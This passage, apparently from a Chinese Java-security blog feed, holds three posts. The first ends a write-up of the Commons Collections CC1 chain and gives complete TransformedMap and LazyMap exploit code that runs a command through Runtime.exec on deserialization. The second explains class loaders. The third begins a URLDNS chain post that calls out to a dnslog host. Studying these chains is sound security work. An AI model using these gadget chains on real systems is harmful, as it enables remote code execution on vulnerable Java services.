java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">////      invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);        <span class="comment">//随便写个键值对，防止map为空</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);    <span class="comment">//相当于第十二行代码</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())&#123;       //遍历TransformedMap</span></span><br><span class="line"><span class="comment">//            entry.setValue(r);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annocationInvocationHandler</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annocationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annocationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method method = c.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) method.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method run = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        run.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LazyMap版CC1链分析"><a href="#LazyMap版CC1链分析" class="headerlink" title="LazyMap版CC1链分析"></a>LazyMap版CC1链分析</h5><p>ysoserial中用的是LazyMap构造的链子</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312095520089.png" alt="image-20230312095520089" style="zoom: 67%;" /><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annocationInvocationHandler</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annocationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annocationInvocationHandler.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annocationInvocationHandler.newInstance(Override.class,mapProxy);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230312093924708.png" alt="image-20230312093924708"></p><p><strong>汇总</strong></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230311234030640.png" alt="image-20230311234030640"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Common-Collections&quot;&gt;&lt;a href=&quot;#Common-Collections&quot; class=&quot;headerlink&quot; title=&quot;Common-Collections&quot;&gt;&lt;/a&gt;Common-Collections&lt;/h4&gt;&lt;p&gt; 相关介绍&lt;</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="Common Collections" scheme="https://micgo.top/tags/Common-Collections/"/>
    
  </entry>
  
  <entry>
    <title>类的动态加载</title>
    <link href="https://micgo.top/java-security/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <id>https://micgo.top/java-security/%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</id>
    <published>2023-03-08T16:00:00.000Z</published>
    <updated>2023-03-10T01:36:39.200Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h4><p><strong>类加载器 ClassLoader</strong></p><ul><li>加载 Class 文件</li></ul><p>以这段简单代码为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student student = new Student();</span><br></pre></td></tr></table></figure><p>我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，<strong>类加载器</strong>做的便是这个工作</p><p>ClassLoader 的工作如图所示</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230309162153489.png" alt="image-20230309162153489" style="zoom: 43%;" /><h5 id="几种加载器"><a href="#几种加载器" class="headerlink" title="几种加载器"></a>几种加载器</h5><ol><li>引导类加载器</li></ol><blockquote><p>引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分</p></blockquote><p>不继承<code>java.lang.ClassLoader</code>类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在<code>/jre/lib/rt.jar</code>目录当中。(同时处于安全考虑，<code>BootstrapClassLoader</code>只加载包名为<code>java</code>、<code>javax</code>、<code>sun</code>等开头的类)</p><ol start="2"><li>扩展类加载器（ExtensionsClassLoader）</li></ol><p>扩展类加载器(ExtensionsClassLoader) 由<code>sun.misc.Launcher$ExtClassLoader</code> 类实现，用来在<code>/jre/lib/ext</code>或者<code>java.ext.dirs</code>中指明的目录加载 java 的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类</p><ol start="3"><li>App类加载器（AppClassLoader）</li></ol><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由<code>sun.misc.Launcher$AppClassLoader</code>实现，一般通过通过(<code>java.class.path</code>或者<code>Classpath</code>环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用<code>ClassLoader.getSystemClassLoader()</code>来获取它</p><h5 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h5><p>如果一个类加载器收到类加载请求，会首先把加载请求委派给父类加载器完成，每个层次的类加载器都是这样，最终所有的加载请求都传动到最根的启动类加载器来完成，如果父类加载器无法完成该加载请求（即自己加载的范围内找不到该类），子类加载器才会尝试自己加载</p><p>这样的双亲委派模型有个好处，就是<strong>所有的类都尽可能由顶层的类加载器加载</strong>，<strong>保证了加载的类的唯一性</strong>。如果每个类都随机由不同的类加载器加载，则类的实现关系无法保证，对于保证Java程序的稳定运行意义重大</p><h5 id="各场景下代码块加载顺序"><a href="#各场景下代码块加载顺序" class="headerlink" title="各场景下代码块加载顺序"></a>各场景下代码块加载顺序</h5><blockquote><p> 这里的代码块主要指的是这四种</p><ul><li>静态代码块：<code>static&#123;&#125;</code></li><li>构造代码块：<code>&#123;&#125;</code></li><li>无参构造器：<code>ClassName()</code></li><li>有参构造器：<code>ClassName(String name)</code></li></ul></blockquote><p>场景一：通过<code>new</code>关键字实例化的对象，先调用<strong>静态代码块</strong>，然后调用<strong>构造代码块</strong>，最后根据实例化方式不同，调用不同的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景二：不实例化对象直接调用静态方法，会先调用类中的静态代码块，然后调用静态方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Person.staticAction();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景三：在对静态成员变量赋值前，会调用<strong>静态代码块</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> Person.staticVar = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景四： 使用 class 获取类，并不会加载类，也就是什么也不会输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Person.class;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;     <span class="comment">//没有输出</span></span><br></pre></td></tr></table></figure><p>场景五、使用 forName 获取类 ，我们写三种<code>forName</code>的方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line"> Class.forName(<span class="string">&quot;src.DynamicClassLoader.Person&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;    <span class="comment">//输出静态代码块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line"> Class.forName(<span class="string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="literal">true</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;    <span class="comment">//输出静态代码块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码块的启动器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line"> Class.forName(<span class="string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="literal">false</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;   <span class="comment">//没有输出</span></span><br></pre></td></tr></table></figure><p><code>Class.forName(className)</code>和<code>Class.forName(className, true, ClassLoader.getSystemClassLoader())</code>等价，这两个方法都会调用类中的<strong>静态代码块</strong>，如果将第二个参数设置为<code>false</code>，那么就不会调用<strong>静态代码块</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;类的动态加载&quot;&gt;&lt;a href=&quot;#类的动态加载&quot; class=&quot;headerlink&quot; title=&quot;类的动态加载&quot;&gt;&lt;/a&gt;类的动态加载&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;类加载器 ClassLoader&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加载 Clas</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="动态加载" scheme="https://micgo.top/tags/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化——URLDNS链</title>
    <link href="https://micgo.top/java-security/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://micgo.top/java-security/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-03-07T16:00:00.000Z</published>
    <updated>2023-03-08T09:25:17.424Z</updated>
    
    <content type="html"><![CDATA[<p><strong>序列化和反序列化</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225103722699.png" alt="image-20230225103722699" style="zoom: 50%;" /><h4 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h4><p><strong>原理</strong></p><p><code>java.util.HashMap</code> 实现了 <code>Serializable</code> 接口，重写了 <code>readObject</code>，在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode ，而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名，从而发出 DNS 请求</p><p>该利用链具有如下特点</p><ul><li>不限制 jdk 版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li><li>只对指定的 URL 发送 DNS 查询，不做其他操作</li><li>在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列列化漏洞</li></ul><p><strong>序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//这里不要发起请求，把url对象的hashcode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://gkkog0.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这里把hashcode改回-1（通过反射改变已有对象属性）</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSeriazationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title 